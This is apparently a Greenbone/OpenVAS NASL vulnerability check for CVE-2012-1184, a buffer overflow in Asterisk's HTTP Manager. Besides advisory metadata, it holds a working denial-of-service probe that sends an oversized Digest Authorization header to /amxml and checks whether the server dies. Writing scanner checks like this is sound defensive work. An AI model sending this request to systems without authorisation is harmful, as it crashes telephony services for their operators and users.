if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.802838" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_cve_id( "CVE-2012-1184" );
	script_bugtraq_id( 52815 );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2012-04-23 16:56:33 +0530 (Mon, 23 Apr 2012)" );
	script_name( "Asterisk HTTP Manager Buffer Overflow Vulnerability" );
	script_xref( name: "URL", value: "http://secunia.com/advisories/48417/" );
	script_xref( name: "URL", value: "http://securitytracker.com/id/1026813" );
	script_xref( name: "URL", value: "http://xforce.iss.net/xforce/xfdb/74083" );
	script_xref( name: "URL", value: "https://issues.asterisk.org/jira/browse/ASTERISK-19542" );
	script_xref( name: "URL", value: "http://downloads.asterisk.org/pub/security/AST-2012-003.html" );
	script_category( ACT_DENIAL );
	script_copyright( "Copyright (C) 2012 Greenbone Networks GmbH" );
	script_family( "Buffer overflow" );
	script_dependencies( "gb_get_http_banner.sc" );
	script_require_ports( "Services/www", 8080, 8088 );
	script_mandatory_keys( "Asterisk/banner" );
	script_tag( name: "insight", value: "The flaw is due to an error in the 'ast_parse_digest()' function
  (main/utils.c) in HTTP Manager, which fails to handle 'HTTP Digest Authentication' information sent
  via a crafted request with an overly long string." );
	script_tag( name: "solution", value: "Upgrade to Asterisk 1.8.10.1, 10.2.1 or later." );
	script_tag( name: "summary", value: "This host is running Asterisk and is prone to buffer overflow
  vulnerability." );
	script_tag( name: "impact", value: "Successful exploitation may allow remote attackers to execute arbitrary code
  within the context of the application or cause a denial of service condition." );
	script_tag( name: "affected", value: "Asterisk version 1.8.x before 1.8.10.1, 10.x before 10.2.1 and 10.3.0." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "exploit" );
	exit( 0 );
}
require("http_func.inc.sc");
require("port_service_func.inc.sc");
port = http_get_port( default: 8080 );
host = http_host_name( port: port );
banner = http_get_remote_headers( port: port );
if(!banner || !ContainsString( banner, "Server: Asterisk" )){
	exit( 0 );
}
if(http_is_dead( port: port )){
	exit( 0 );
}
req = NASLString( "GET /amxml HTTP/1.1\\r\\n", "Host: ", host, ":", port, "\\r\\n", "Authorization: Digest ", crap( data: "a", length: 700 ), "\\r\\n\\r\\n" );
http_send_recv( port: port, data: req );
if(http_is_dead( port: port )){
	security_message( port: port );
	exit( 0 );
}
exit( 99 );

